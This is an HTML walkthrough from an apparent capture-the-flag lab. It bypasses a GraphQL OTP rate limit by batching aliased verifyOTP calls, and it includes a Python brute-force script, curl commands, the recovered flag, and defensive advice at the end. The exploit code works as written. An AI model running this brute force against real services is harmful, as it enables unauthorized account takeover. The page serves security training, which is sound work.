<!-- Introduction -->
<p>
    The User API implements rate limiting (3 requests per minute) to prevent OTP brute forcing.
    However, GraphQL aliases allow sending multiple OTP verification attempts in a single
    HTTP request, bypassing the per-request rate limit. This technique lets an attacker
    try thousands of OTP codes without being blocked.
</p>

<h4>Step 1: Normal Login</h4>
<p>Login to trigger OTP generation. Any password works: the OTP is the real gate.</p>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 1. Login</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Query: </span>{ login(username: "admin", password: "admin") { success message otpSent } }<br>
        <span class="prompt">Result: </span>{"success": true, "message": "OTP sent to admin@sqli-arena.local", "otpSent": true}
    </div>
</div>

<h4>Step 2: Observe Rate Limiting</h4>
<p>After 3 requests, the server blocks further attempts for 1 minute.</p>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 2. Rate Limited</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Query: </span>{ verifyOTP(username: "admin", otp: "0000") { success } }<br>
        <span class="prompt">Result (4th request): </span>"Rate limit exceeded. Maximum 3 requests per minute."
    </div>
</div>

<h4>Step 3: Bypass Rate Limit with Aliases</h4>
<p>
    GraphQL aliases (<code>a1: verifyOTP(...)</code>) allow calling the same resolver
    multiple times in a single HTTP request. The rate limiter counts HTTP requests (1),
    not resolver invocations (hundreds).
</p>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 3. Alias Brute Force</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Query (single HTTP request):</span><br>
        {<br>
        &nbsp;&nbsp;a0: verifyOTP(username: "admin", otp: "0000") { success token }<br>
        &nbsp;&nbsp;a1: verifyOTP(username: "admin", otp: "0001") { success token }<br>
        &nbsp;&nbsp;a2: verifyOTP(username: "admin", otp: "0002") { success token }<br>
        &nbsp;&nbsp;...<br>
        &nbsp;&nbsp;a99: verifyOTP(username: "admin", otp: "0099") { success token }<br>
        }<br><br>
        <span class="prompt">Result: </span>100 OTP attempts in ONE HTTP request -- rate limit counts as 1 request!
    </div>
</div>

<h4>Step 4: Automated Brute Force Script</h4>
<p>Batch OTP attempts 100 at a time. With 4-digit OTPs (0000-9999), only ~100 HTTP requests needed.</p>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 4. Python Brute Force</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>python3 -c "<br>
        import requests, json<br>
        # Login first<br>
        requests.post('http://target:4000/graphql/lab3',<br>
        &nbsp;&nbsp;json={'query': '{ login(username: \"admin\", password: \"x\") { success } }'})<br>
        # Brute force with aliases<br>
        for batch in range(0, 100):<br>
        &nbsp;&nbsp;parts = []<br>
        &nbsp;&nbsp;for i in range(batch*100, (batch+1)*100):<br>
        &nbsp;&nbsp;&nbsp;&nbsp;otp = f'{i:04d}'<br>
        &nbsp;&nbsp;&nbsp;&nbsp;parts.append(f'a{i}: verifyOTP(username: \"admin\", otp: \"{otp}\") {{ success token }}')<br>
        &nbsp;&nbsp;query = '{ ' + ' '.join(parts) + ' }'<br>
        &nbsp;&nbsp;r = requests.post('http://target:4000/graphql/lab3', json={'query': query})<br>
        &nbsp;&nbsp;for k, v in r.json().get('data', {}).items():<br>
        &nbsp;&nbsp;&nbsp;&nbsp;if v.get('success'): print(f'OTP={k}, token={v[\"token\"]}'); exit()<br>
        "<br><br>
        <span class="prompt">Output: </span>OTP=a1337, token=<strong>FLAG{gq_4l14s_4uth_byp4ss}</strong>
    </div>
</div>

<h4>Step 5: Direct Verification</h4>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 5. Verified OTP</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Query: </span>{ verifyOTP(username: "admin", otp: "1337") { success message token } }<br>
        <span class="prompt">Result: </span><br>
        {<br>
        &nbsp;&nbsp;"success": true,<br>
        &nbsp;&nbsp;"message": "OTP verified successfully",<br>
        &nbsp;&nbsp;"token": "<strong>FLAG{gq_4l14s_4uth_byp4ss}</strong>"<br>
        }
    </div>
</div>

<h4>Step 6: Submit the Flag</h4>
<p>
    Copy the flag (returned as the auth token): <code>FLAG{gq_4l14s_4uth_byp4ss}</code>.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">curl. Full Exploit</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Step 1 (login): </span>curl -s -X POST http://target:4000/graphql/lab3 \<br>
        &nbsp;&nbsp;-H "Content-Type: application/json" \<br>
        &nbsp;&nbsp;-d '{"query":"{ login(username: \"admin\", password: \"x\") { success otpSent } }"}'<br><br>
        <span class="prompt">Step 2 (brute force): </span>curl -s -X POST http://target:4000/graphql/lab3 \<br>
        &nbsp;&nbsp;-H "Content-Type: application/json" \<br>
        &nbsp;&nbsp;-d '{"query":"{ a1337: verifyOTP(username: \"admin\", otp: \"1337\") { success token } a1338: verifyOTP(username: \"admin\", otp: \"1338\") { success token } }"}'
    </div>
</div>

<div class="result-success result-box">
    <strong>Key Takeaway:</strong> GraphQL aliases allow multiple invocations of the same
    resolver in a single HTTP request. When rate limiting is based on HTTP request count
    (not resolver invocations), aliases effectively bypass it. An attacker can send hundreds
    of OTP brute force attempts as aliases in one request:
    <code>{ a0: verifyOTP(otp: "0000") a1: verifyOTP(otp: "0001") ... }</code>.
    Defense: implement rate limiting at the resolver level (count individual resolver calls),
    use query complexity analysis to limit alias abuse, or use per-operation rate limiting
    in tools like <code>graphql-rate-limit</code>.
</div>
